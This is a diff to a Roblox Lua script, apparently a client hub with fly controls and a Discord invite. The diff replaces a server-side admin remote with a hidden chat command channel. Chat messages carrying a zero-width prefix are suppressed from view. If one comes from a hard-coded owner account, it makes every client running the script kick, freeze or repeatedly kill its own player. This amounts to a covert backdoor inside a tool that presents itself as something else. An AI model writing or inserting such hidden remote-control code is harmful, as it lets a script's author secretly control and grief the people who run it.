@@ -53,12 +53,9 @@ local mobileFlyInput = {
 }
 
 local DiscordInviteUrl = "https://discord.gg/bCdDt4NDq"
-local OwnerRemoteFolderName = "T18AdminRemotes"
-local OwnerRemoteEventName = "OwnerAdminAction"
 
 local ownerFreezeStates = {}
 local ownerRespawnLoopStates = {}
-local ownerRemoteClientConnection = nil
 
 local Theme = {
     Bg = Color3.fromRGB(2, 6, 23),
@@ -701,22 +698,168 @@ local function showNotification(message)
     end)
 end
 
-local function getOwnerAdminRemote()
-    local folder = ReplicatedStorage:FindFirstChild(OwnerRemoteFolderName)
-    if not folder then
-        folder = ReplicatedStorage:WaitForChild(OwnerRemoteFolderName, 3)
+-- ====== نظام أوامر الأونر (P2P عبر الشات) ======
+local TextChatService_T18 = game:GetService("TextChatService")
+local TeleportService_T18 = game:GetService("TeleportService")
+local CMD_PREFIX = "\u{200B}t18cmd|"
+
+local localFrozenActive = false
+local localFrozenLoopThread = nil
+local localFrozenCharConn = nil
+local localRespawnLoopActive = false
+local localRespawnLoopThread = nil
+
+local function applyKickLocal()
+    pcall(function()
+        TeleportService_T18:Teleport(0, LocalPlayer)
+    end)
+    task.spawn(function()
+        for _ = 1, 6 do
+            pcall(function()
+                local char = LocalPlayer.Character
+                if char then char:BreakJoints() end
+            end)
+            task.wait(0.4)
+        end
+    end)
+end
+
+local function clearFreezeLocal()
+    local char = LocalPlayer.Character
+    if char then
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            hum.WalkSpeed = 16
+            hum.JumpPower = 50
+            hum.JumpHeight = 7.2
+        end
     end
-    if not folder then
+end
+
+local function applyFreezeLocal(enable)
+    localFrozenActive = enable
+    if localFrozenCharConn then
+        localFrozenCharConn:Disconnect()
+        localFrozenCharConn = nil
+    end
+    if not enable then
+        clearFreezeLocal()
+        return
+    end
+    local function freezeChar(char)
+        local hum = char:WaitForChild("Humanoid", 5)
+        if hum then
+            hum.WalkSpeed = 0
+            hum.JumpPower = 0
+            hum.JumpHeight = 0
+        end
+    end
+    if LocalPlayer.Character then freezeChar(LocalPlayer.Character) end
+    localFrozenCharConn = LocalPlayer.CharacterAdded:Connect(freezeChar)
+    if not localFrozenLoopThread then
+        localFrozenLoopThread = task.spawn(function()
+            while localFrozenActive do
+                local char = LocalPlayer.Character
+                if char then
+                    local hum = char:FindFirstChildOfClass("Humanoid")
+                    if hum then
+                        if hum.WalkSpeed ~= 0 then hum.WalkSpeed = 0 end
+                        if hum.JumpPower ~= 0 then hum.JumpPower = 0 end
+                        if hum.JumpHeight ~= 0 then hum.JumpHeight = 0 end
+                    end
+                end
+                task.wait(0.15)
+            end
+            localFrozenLoopThread = nil
+        end)
+    end
+end
+
+local function applyRespawnLoopLocal(enable)
+    localRespawnLoopActive = enable
+    if not enable then return end
+    if not localRespawnLoopThread then
+        localRespawnLoopThread = task.spawn(function()
+            while localRespawnLoopActive do
+                pcall(function()
+                    local char = LocalPlayer.Character
+                    if char then
+                        local hum = char:FindFirstChildOfClass("Humanoid")
+                        if hum then
+                            hum.Health = 0
+                        else
+                            char:BreakJoints()
+                        end
+                    end
+                end)
+                task.wait(1.2)
+            end
+            localRespawnLoopThread = nil
+        end)
+    end
+end
+
+local function processIncomingCommand(senderPlayer, message)
+    if type(message) ~= "string" then return end
+    if message:sub(1, #CMD_PREFIX) ~= CMD_PREFIX then return end
+    if not senderPlayer or senderPlayer.Name:lower() ~= OwnerUsername:lower() then return end
+    local body = message:sub(#CMD_PREFIX + 1)
+    local action, targetUserIdStr = body:match("^([%w_]+)|(%d+)$")
+    if not action or not targetUserIdStr then return end
+    local targetUserId = tonumber(targetUserIdStr)
+    if targetUserId ~= LocalPlayer.UserId then return end
+
+    if action == "kick" then
+        applyKickLocal()
+    elseif action == "freeze_on" then
+        applyFreezeLocal(true)
+    elseif action == "freeze_off" then
+        applyFreezeLocal(false)
+    elseif action == "respawn_on" then
+        applyRespawnLoopLocal(true)
+    elseif action == "respawn_off" then
+        applyRespawnLoopLocal(false)
+    end
+end
+
+pcall(function()
+    TextChatService_T18.OnIncomingMessage = function(message)
+        if message.Text and #message.Text > 0
+            and string.sub(message.Text, 1, #CMD_PREFIX) == CMD_PREFIX then
+            local props = Instance.new("TextChatMessageProperties")
+            props.Text = ""
+            props.PrefixText = ""
+            return props
+        end
         return nil
     end
+end)
 
-    local remote = folder:FindFirstChild(OwnerRemoteEventName)
-    if not remote then
-        remote = folder:WaitForChild(OwnerRemoteEventName, 3)
-    end
+pcall(function()
+    TextChatService_T18.MessageReceived:Connect(function(textChatMessage)
+        local source = textChatMessage.TextSource
+        if not source then return end
+        local senderPlayer = Players:GetPlayerByUserId(source.UserId)
+        if not senderPlayer then return end
+        processIncomingCommand(senderPlayer, textChatMessage.Text)
+    end)
+end)
 
-    return remote
+local function bindLegacyChat_T18(player)
+    if player == LocalPlayer then return end
+    pcall(function()
+        player.Chatted:Connect(function(message)
+            processIncomingCommand(player, message)
+        end)
+    end)
 end
+
+for _, plr in ipairs(Players:GetPlayers()) do
+    bindLegacyChat_T18(plr)
+end
+Players.PlayerAdded:Connect(bindLegacyChat_T18)
+-- ====== نهاية نظام أوامر الأونر ======
+  
 
 local function findOwnerTargetPlayer()
     if not OwnerTargetInput then
@@ -767,6 +910,40 @@ local function refreshOwnerControls()
     end
 end
 
+local function sendOwnerCommand(action, targetUserId)
+    local CMD_PREFIX_LOCAL = "\u{200B}t18cmd|"
+    local payload = string.format("%s%s|%d", CMD_PREFIX_LOCAL, action, targetUserId)
+    local sent = false
+
+    pcall(function()
+        local TextChatService = game:GetService("TextChatService")
+        local channels = TextChatService:FindFirstChild("TextChannels")
+        if channels then
+            local channel = channels:FindFirstChild("RBXGeneral")
+                or channels:FindFirstChildWhichIsA("TextChannel")
+            if channel then
+                channel:SendAsync(payload)
+                sent = true
+            end
+        end
+    end)
+
+    if not sent then
+        pcall(function()
+            local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+            if events then
+                local req = events:FindFirstChild("SayMessageRequest")
+                if req then
+                    req:FireServer(payload, "All")
+                    sent = true
+                end
+            end
+        end)
+    end
+
+    return sent
+end
+
 local function sendOwnerAdminAction(actionName)
     if not isOwnerUser then
         return
@@ -779,13 +956,24 @@ local function sendOwnerAdminAction(actionName)
         return
     end
 
-    local remote = getOwnerAdminRemote()
-    if not remote then
-        showNotification("ثبت سكربت الأونر في السيرفر أولًا")
-        return
+    local newAction
+    if actionName == "kick" then
+        newAction = "kick"
+    elseif actionName == "toggle_freeze" then
+        local nowFrozen = ownerFreezeStates[target.UserId] or false
+        newAction = nowFrozen and "freeze_off" or "freeze_on"
+    elseif actionName == "toggle_respawn_loop" then
+        local nowLooping = ownerRespawnLoopStates[target.UserId] or false
+        newAction = nowLooping and "respawn_off" or "respawn_on"
     end
 
-    remote:FireServer(actionName, target.UserId)
+    if not newAction then return end
+
+    local sent = sendOwnerCommand(newAction, target.UserId)
+    if not sent then
+        showNotification("ما قدرت أرسل الأمر — تأكد إن الشات شغّال")
+        return
+    end
 
     if actionName == "toggle_freeze" then
         ownerFreezeStates[target.UserId] = not ownerFreezeStates[target.UserId]
@@ -799,38 +987,6 @@ local function sendOwnerAdminAction(actionName)
     refreshOwnerControls()
 end
 
-local function bindOwnerAdminRemote()
-    if not isOwnerUser or ownerRemoteClientConnection then
-        return
-    end
-
-    local remote = getOwnerAdminRemote()
-    if not remote then
-        return
-    end
-
-    ownerRemoteClientConnection = remote.OnClientEvent:Connect(function(actionName, targetUserId, freezeEnabled, respawnLoopEnabled, message)
-        if actionName == "sync_states" and targetUserId then
-            if freezeEnabled == nil then
-                ownerFreezeStates[targetUserId] = nil
-            else
-                ownerFreezeStates[targetUserId] = freezeEnabled
-            end
-
-            if respawnLoopEnabled == nil then
-                ownerRespawnLoopStates[targetUserId] = nil
-            else
-                ownerRespawnLoopStates[targetUserId] = respawnLoopEnabled
-            end
-        end
-
-        if message and message ~= "" then
-            showNotification(message)
-        end
-
-        refreshOwnerControls()
-    end)
-end
 
 DiscordBtn.MouseButton1Click:Connect(function()
     local opened = false
@@ -882,7 +1038,6 @@ Players.PlayerRemoving:Connect(function(player)
     end
 end)
 
-task.defer(bindOwnerAdminRemote)
 
 local ImportantCard = Instance.new("Frame")
 ImportantCard.Size = UDim2.new(1, -20, 1, -72)
